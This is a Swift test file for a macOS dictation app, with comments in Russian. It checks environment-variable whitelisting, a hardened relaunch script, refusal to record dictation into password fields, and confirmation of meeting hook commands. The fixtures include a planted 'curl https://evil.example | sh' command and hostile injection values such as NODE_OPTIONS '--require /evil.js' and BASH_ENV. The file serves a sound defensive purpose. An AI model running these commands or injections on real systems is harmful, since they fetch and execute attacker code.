import Foundation
import MostikCore

/// П10, прогон 4. Р4-1: окружение дочерних процессов — белый список, без `DEVELOPER_DIR`/`TOOLCHAINS`/`SDKROOT`
/// (шимы `/usr/bin/git`, `xcrun`, `python3` запускают `$DEVELOPER_DIR/usr/bin/xcrun`). Р4-2: самоперезапуск.
func runRound4EnvironmentTests() {
    let hostile = ["DEVELOPER_DIR": "/evil/dev", "SDKROOT": "/evil/sdk", "TOOLCHAINS": "evil",
                   "NODE_OPTIONS": "--require /evil.js", "BASH_ENV": "/evil.sh", "ENV": "/evil.sh", "ZDOTDIR": "/evil",
                   "PERL5OPT": "-Mevil", "RUBYOPT": "-revil", "GIT_DIR": "/evil", "SOMETHING_ELSE": "x"]
    let base = hostile.merging(["PATH": "/opt/homebrew/bin:/usr/bin", "HOME": "/Users/a", "LANG": "ru_RU.UTF-8",
                                "LC_ALL": "ru_RU.UTF-8", "TMPDIR": "/t/", "ANTHROPIC_API_KEY": "k",
                                "HTTPS_PROXY": "http://proxy:3128", "MOSTIK_LLM_MODEL": "m",
                                "TRANSCRIBER_UNPIN": "1", "HF_HOME": "/hf"]) { $1 }
    for debug in [false, true] {
        let env = EngineLaunch.environment(base: base, home: URL(fileURLWithPath: "/h"), crashDir: nil, debug: debug)
        let leaked = Set(hostile.keys).intersection(env.keys).sorted()
        equal(leaked, [], "Р4-1: движку (debug: \(debug)) — белый список")
        equal(env["HOME"], "/Users/a")
        equal(env["LC_ALL"], "ru_RU.UTF-8")
        equal(env["ANTHROPIC_API_KEY"], "k", "вход claude не ломаем")
        equal(env["HTTPS_PROXY"], "http://proxy:3128", "прокси для claude не ломаем")
        equal(env["MOSTIK_LLM_MODEL"], "m", "свои настройки движка остаются")
    }
    let dev = EngineLaunch.environment(base: base, home: URL(fileURLWithPath: "/h"), crashDir: nil, debug: true)
    equal(dev["PATH"], "/opt/homebrew/bin:/usr/bin", "в debug-сборке PATH как был")
    equal(dev["TRANSCRIBER_UNPIN"], "1")
    var old = base
    EngineEnvironment.apply(to: &old, debug: true)
    check(old["DEVELOPER_DIR"] == nil && old["TOOLCHAINS"] == nil && old["SDKROOT"] == nil,
          "EngineEnvironment.apply снимает переменные toolchain и в debug")

    // Р4-2: самоперезапуск — `/bin/sh` читает `BASH_ENV`/`ENV`, а `sleep` и `open` искал по PATH родителя.
    let app = URL(fileURLWithPath: #filePath).deletingLastPathComponent().deletingLastPathComponent()
        .appendingPathComponent("Mostik/AppController.swift")
    let controller = (try? String(contentsOf: app, encoding: .utf8)) ?? ""
    check(controller.contains("Relaunch."), "Р4-2: AppController перезапускается через Relaunch")
    check(!controller.contains("do sleep 0.2; done; open"), "Р4-2: без голых sleep и open")
}

func runRelaunchTests() {
    let args = Relaunch.arguments(pid: 42, bundlePath: "/Applications/Mo stik.app")
    equal(args.first, "-c")
    equal(Array(args.suffix(2)), ["/Applications/Mo stik.app", "42"], "путь и pid — аргументами, не в тексте")
    let script = args[1]
    check(script.contains("/bin/sleep") && script.contains("/usr/bin/open") && script.contains("/bin/kill"), "полные пути")
    check(!script.contains("Mo stik") && !script.contains("42"), "в скрипт ничего не подставлено")
    let env = Relaunch.environment(["PATH": "/evil:/usr/bin", "BASH_ENV": "/evil.sh", "ENV": "/evil.sh",
                                    "DEVELOPER_DIR": "/evil", "HOME": "/h"])
    equal(env["PATH"], ToolEnvironment.defaultPath)
    check(env["BASH_ENV"] == nil && env["ENV"] == nil && env["DEVELOPER_DIR"] == nil, "sh без BASH_ENV/ENV")
    equal(env["HOME"], "/h")
}

/// Р4-4л: диктовка в поле пароля — не записываем; запись «secure_input» в истории — без текста и звука.
func runSecureDictationHistoryTests() {
    let dir = FileManager.default.temporaryDirectory.appendingPathComponent("mostik-r4-\(UUID().uuidString)", isDirectory: true)
    defer { try? FileManager.default.removeItem(at: dir) }
    let recordings = dir.appendingPathComponent("recordings", isDirectory: true)
    try? FileManager.default.createDirectory(at: recordings, withIntermediateDirectories: true)
    let wav = recordings.appendingPathComponent("s1.wav")
    FileManager.default.createFile(atPath: wav.path, contents: Data([1, 2, 3]))
    let store = HistoryStore(fileURL: dir.appendingPathComponent("history.jsonl"), audioRoot: recordings)
    var entry = HistoryEntry(id: "s1", text: "Пароль Корова42", insertedText: "Пароль Корова42",
                             doubts: [Doubt(heard: "корова", suggestion: "Корова42")], audioPath: wav.path,
                             outcome: "secure_input", rawText: "пароль корова сорок два")
    entry.corrections = [Correction(from: "корова", to: "Корова42")]
    try? store.append(entry)
    let raw = (try? String(contentsOf: store.fileURL, encoding: .utf8)) ?? ""
    check(!raw.contains("Корова42") && !raw.contains("корова"), "Р4-4л: текст из поля пароля не ложится в history.jsonl")
    check(!FileManager.default.fileExists(atPath: wav.path), "Р4-4л: звук продиктованного пароля удалён")
    check(raw.contains("secure_input"), "сама запись остаётся: видно, что вставка отклонена")
    try? store.append(HistoryEntry(id: "s2", text: "обычный текст", outcome: "inserted"))
    let after = (try? String(contentsOf: store.fileURL, encoding: .utf8)) ?? ""
    check(after.contains("обычный текст"), "обычные записи как раньше")

    // Решение: защищённый ввод или AX-роль поля пароля — не записываем, с понятной причиной.
    check(SecureDictation.refusal(secureInput: false, field: nil) == nil, "обычное поле — пишем")
    check(SecureDictation.refusal(secureInput: false, field: FieldSnapshot(bundleID: "a", role: "AXTextField")) == nil)
    equal(SecureDictation.refusal(secureInput: true, field: nil), "Поле пароля — Mostik не записывает")
    check(SecureDictation.refusal(secureInput: false, field: FieldSnapshot(bundleID: "a", role: "AXTextField",
                                                                            subrole: "AXSecureTextField")) != nil,
          "поле пароля по AX-роли, даже без защищённого ввода")
    let plain = HistoryEntry(id: "x", text: "t", outcome: "clipboard")
    equal(SecureDictation.forHistory(plain), plain, "другие исходы не трогаем")

    // Путь старта записи проверяет защищённый ввод до записи и после снимка поля.
    let app = URL(fileURLWithPath: #filePath).deletingLastPathComponent().deletingLastPathComponent()
        .appendingPathComponent("Mostik/AppController.swift")
    let controller = (try? String(contentsOf: app, encoding: .utf8)) ?? ""
    func body(_ name: String) -> String {
        controller.components(separatedBy: "private func \(name)(").dropFirst().first?
            .components(separatedBy: "private func ").first ?? ""
    }
    // «Плавность и быстродействие», шаг 1: старт записи разделён — запись и плашка в beginRecording,
    // снимок поля и `start` движку — в planRecording. Первая проверка — до записи, вторая — по снимку
    // поля и до того, как движок узнает о записи.
    let begin = body("beginRecording"), plan = body("planRecording")
    check(begin.components(separatedBy: "SecureDictation.refusal(").count - 1 >= 1
          && (begin.range(of: "SecureDictation.refusal(")?.lowerBound ?? begin.endIndex)
             < (begin.range(of: "recorder.begin")?.lowerBound ?? begin.startIndex),
          "Р4-4л: beginRecording проверяет поле пароля до записи")
    check((plan.range(of: "SecureDictation.refusal(")?.lowerBound ?? plan.endIndex)
             < (plan.range(of: "engine.startSession(")?.lowerBound ?? plan.startIndex),
          "Р4-4л: по снимку поля — до start движку")
}

/// Р4-3: включение хука переключателем не подтверждает команду, которую пользователь не видел.
func runHookEnableConfirmTests() {
    let planted = "cp \"$1/meeting.md\" ~/Vault/\ncurl https://evil.example | sh"
    let off = MeetingHookSettings(enabled: false, command: planted)
    var on = off; on.enabled = true
    do {
        let store = FakeHookDigestStore()
        let result = MeetingHookTrust.applyChange(old: off, new: on, store: store)
        equal(store.writes, [], "Р4-3: только включили — чужую команду не подтверждаем")
        check(!result.settings.enabled, "Р4-3: остаётся выключенным до ответа")
        equal(result.ask, planted, "Р4-3: показываем команду и спрашиваем")
    }
    do {
        let store = FakeHookDigestStore()
        store.stored = .value(MeetingHookTrust.digest(planted))
        let result = MeetingHookTrust.applyChange(old: off, new: on, store: store)
        check(result.settings.enabled && result.ask == nil, "своя подтверждённая команда включается без вопроса")
    }
    do {
        let store = FakeHookDigestStore()
        var typed = on; typed.command = "echo мой"
        let result = MeetingHookTrust.applyChange(old: off, new: typed, store: store)
        equal(store.writes, [MeetingHookTrust.digest("echo мой")], "введённая в Настройках команда — воля пользователя")
        check(result.settings.enabled && result.ask == nil)
    }
    // «Не запускать» не оставляет подложенную команду в настройках.
    let denied = MeetingHookTrust.answer(false, settings: off, store: FakeHookDigestStore())
    check(!denied.enabled)
    equal(denied.command, "", "Р4-3: отклонённая команда стирается")
}

/// Р4-4и: очередь агента — не обход `AutoEnterGuard`: причёсанный с контекстом терминала текст в очередь не идёт.
func runAgentQueueGuardTests() {
    let app = URL(fileURLWithPath: #filePath).deletingLastPathComponent().deletingLastPathComponent()
        .appendingPathComponent("Mostik/AppController.swift")
    let controller = (try? String(contentsOf: app, encoding: .utf8)) ?? ""
    check(controller.contains("AgentQueue.allowsEnqueue(contextSent: current.polishContextSent"),
          "Р4-4и: AppController спрашивает AgentQueue.allowsEnqueue перед очередью")
    check(!AgentQueue.allowsEnqueue(contextSent: true, polished: true), "контекст ушёл в модель — не в очередь")
    check(AgentQueue.allowsEnqueue(contextSent: true, polished: false), "модель не трогала текст — как сказано")
    check(AgentQueue.allowsEnqueue(contextSent: false, polished: true), "без контекста — как раньше")
}
